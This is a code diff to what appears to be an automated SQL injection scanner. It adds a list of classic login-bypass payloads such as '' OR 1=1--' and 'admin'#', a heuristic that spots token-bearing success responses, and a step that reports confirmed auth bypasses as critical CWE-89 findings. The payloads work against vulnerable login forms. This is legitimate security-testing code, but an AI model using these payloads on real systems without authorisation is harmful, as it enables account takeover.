@@ -104,6 +104,32 @@ _PROBE_PAYLOADS: dict[str, str] = {
 }
 
 
+# Roadmap §8.5 Phase 7 — auth-bypass payloads. The boolean-blind
+# triplet above mis-detects on auth endpoints because the
+# `' OR '1'='1` style only works when the SQL query is unquoted
+# (`WHERE x = '...'`) AND the comparison is direct. Many real
+# login endpoints use the `--` comment-out style instead:
+#
+#   email = '<input>' AND password = HASH(<pw>)
+#                ^ SQLi here closes string, then `OR 1=1--`
+#                  comments out the password check.
+#
+# These payloads are the canonical "log in as anyone" set. Each
+# is tried; if ANY of them produces a strong success signal
+# (2xx + JWT / "token" / "success":true) AND the baseline
+# response doesn't, auth-bypass is confirmed.
+_AUTH_BYPASS_PAYLOADS: dict[str, str] = {
+    "auth_bypass_or_1_dashes":     "' OR 1=1--",
+    "auth_bypass_admin_or":        "admin' OR 1=1--",
+    "auth_bypass_or_quoted":       "' OR '1'='1' --",
+    "auth_bypass_or_hash":         "' OR 1=1#",
+    "auth_bypass_admin_hash":      "admin'#",
+    "auth_bypass_or_semicolon":    "' OR 1=1;--",
+    "auth_bypass_close_paren":     "') OR 1=1--",
+    "auth_bypass_admin_close_p":   "admin') OR 1=1--",
+}
+
+
 # Roadmap §8.5 Phase 6 — NoSQL operator payloads. When the probed
 # endpoint is JSON-body-shaped (i.e. `body_template` is a dict), the
 # scanner ALSO sends NoSQL operator injections. MongoDB / similar
@@ -204,6 +230,37 @@ def _bodies_meaningfully_differ(a: str, b: str) -> bool:
     return False
 
 
+def _is_auth_success_response(status: int | None, body: str) -> bool:
+    """Return True when the response shape strongly indicates a
+    successful auth — 2xx + a token-bearing JSON shape.
+
+    Used by the auth-bypass detection path: when an SQLi payload
+    produces such a response and the baseline (random invalid
+    creds) doesn't, we have a confirmed auth bypass.
+    """
+    if not isinstance(status, int) or not (200 <= status < 300):
+        return False
+    if not isinstance(body, str) or not body:
+        return False
+    body_lc = body.lower()
+    # Strong negative markers — even on 2xx, presence means failure.
+    for neg in ("invalid email", "invalid credential", "invalid login",
+                "incorrect password", "wrong password", "authentication failed",
+                "login failed", "unauthorized"):
+        if neg in body_lc:
+            return False
+    # Strong positives — a token shape OR explicit success.
+    import re as _re
+    jwt_re = _re.compile(r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b")
+    if jwt_re.search(body):
+        return True
+    for marker in ('"token"', '"accesstoken"', '"jwt"', '"sessionid"',
+                   '"id_token"', '"success":true', '"authentication"'):
+        if marker in body_lc:
+            return True
+    return False
+
+
 def _strong_response_signal_differs(
     body_a: str, status_a: int | None,
     body_b: str, status_b: int | None,
@@ -268,15 +325,20 @@ def _emit_finding(
         tracer = get_global_tracer()
         if tracer is None:
             return None
-        title = (
-            f"Error-based SQL injection in `{param}`"
-            if detection_kind == "error"
-            else f"Boolean-blind SQL injection in `{param}`"
-        )
+        if detection_kind == "error":
+            title = f"Error-based SQL injection in `{param}`"
+        elif detection_kind == "auth_bypass":
+            title = f"SQL injection auth bypass in `{param}` (login endpoint)"
+        else:
+            title = f"Boolean-blind SQL injection in `{param}`"
         engine_str = f" (DB engine: {db_engine})" if db_engine else ""
+        # Severity bump: auth bypass via SQLi is critical (account
+        # takeover from an unauthenticated attacker); error-based and
+        # boolean-blind start at high.
+        severity_for_kind = "critical" if detection_kind == "auth_bypass" else "high"
         return tracer.add_vulnerability_report(
             title=title,
-            severity="high",
+            severity=severity_for_kind,
             cwe="CWE-89",
             endpoint=url,
             target=url,
@@ -608,7 +670,68 @@ def scan_sqli(
                 )
                 continue  # don't double-emit boolean check on same param
 
-        # 2. Boolean-blind detection (only if error path didn't fire).
+        # 1.5. Auth-bypass detection (Phase 7 — closes the
+        # `sqli-login` manifest gap). When the baseline returns a
+        # failure shape (401 + invalid creds) but an SQLi payload
+        # produces a 2xx + token shape, that's a confirmed auth
+        # bypass via SQLi — even when the boolean-blind comparator
+        # can't distinguish it (e.g. true/false branches both 401
+        # because the parameterized failure path catches them, but
+        # `' OR 1=1--` comments out the password check entirely).
+        baseline_is_auth_failure = (
+            isinstance(baseline_status, int)
+            and not _is_auth_success_response(baseline_status, baseline_body)
+        )
+        if baseline_is_auth_failure:
+            for label, payload in _AUTH_BYPASS_PAYLOADS.items():
+                bypass_resp = _probe(payload, label)
+                if not bypass_resp or not bypass_resp.get("status_code"):
+                    continue
+                bypass_status = bypass_resp.get("status_code")
+                bypass_body = bypass_resp.get("body") or ""
+                if _is_auth_success_response(bypass_status, bypass_body):
+                    seen_endpoint_param.add(key)
+                    excerpt = (
+                        f"baseline (random invalid creds) → "
+                        f"status={baseline_status}, body[:100]="
+                        f"{baseline_body[:100]!r}\n"
+                        f"SQLi auth-bypass payload `{payload}` → "
+                        f"status={bypass_status}, body[:200]="
+                        f"{bypass_body[:200]!r}"
+                    )
+                    report_id = _emit_finding(
+                        url=url, param=param,
+                        detection_kind="auth_bypass",
+                        db_engine=None,
+                        payload=payload,
+                        response_excerpt=excerpt,
+                        verification_status="verified",
+                        confidence=0.98,
+                    )
+                    if report_id:
+                        emitted_count += 1
+                    drafts.append(FindingDraft(
+                        title=f"SQL injection auth bypass in `{param}` (payload: `{payload}`)",
+                        severity="critical",
+                        cwe="CWE-89",
+                        endpoint=url, category="sqli",
+                        verification_status="verified",
+                        confidence=0.98,
+                        description=(
+                            f"Auth bypass via SQLi payload `{payload}` — "
+                            f"baseline returned auth-failure shape, payload "
+                            f"returned 2xx + token shape."
+                        ),
+                    ))
+                    evidence.append(
+                        f"auth-bypass SQLi: {param}={payload[:30]}... "
+                        f"baseline_status={baseline_status} → bypass_status={bypass_status}"
+                    )
+                    break  # one finding per param
+            if key in seen_endpoint_param:
+                continue  # don't run boolean-blind on same param
+
+        # 2. Boolean-blind detection (only if error / auth-bypass paths didn't fire).
         true_resp = _probe(_PROBE_PAYLOADS["boolean_true"], "bool_true")
         false_resp = _probe(_PROBE_PAYLOADS["boolean_false"], "bool_false")
         if not true_resp or not false_resp:
